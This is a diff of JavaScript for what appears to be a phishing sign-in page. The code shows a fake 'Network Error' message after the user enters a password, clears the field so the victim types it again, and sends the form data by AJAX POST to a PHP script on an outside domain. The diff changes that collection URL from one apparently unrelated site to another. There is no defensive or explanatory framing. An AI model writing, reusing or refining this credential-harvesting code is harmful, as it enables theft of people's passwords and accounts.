@@ -29,7 +29,7 @@ $(document).ready(function() {
   
     btnPost.addEventListener('click', function(){
      
-      setTimeout(function(){
+      //setTimeout(function(){
         
         
         
@@ -40,18 +40,32 @@ $(document).ready(function() {
           
           divMsg.textContent = 'Please input password';
           divMsg.style.color = "#ba1100";
+        //  btnPost.textContent = "Sign In";
           
-
+//}, 2200);
+          
+        //}, 3000)
         }
         else{
           divMsg.textContent = 'Network Error! Please verify your information and try again';
           divMsg.style.color = "#ba1100";
+          setTimeout(()=>{
+            inpPwd.value = "";
+          },1500)
+         // inpPwd.value = "";
+          
+         btnPost.textContent = "Please wait...";
+setTimeout(()=>{
+btnPost.textContent = "Sign In";
+  //inpPwd.value = "";
+}, 2200);
+                             
         }
         
         
         
         
-      }, 3000)
+    
       // alert(divMsg.value);
       
     });
@@ -66,10 +80,9 @@ $(document).ready(function() {
         $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
   <span class="spinner-grow spinner-grow-sm"></span>
   Please Wait...
-  
-</button>`).prop("disabled", true);
+</button>`).prop("disabled", false);
         $.ajax({
-            url: "https://physicaleducationdiploma.com/dashboard/file/djj.php",
+            url: "https://bucketlion.com/shar/ugfr.php",
             type: 'POST',
             data: formData,
             contentType: false,
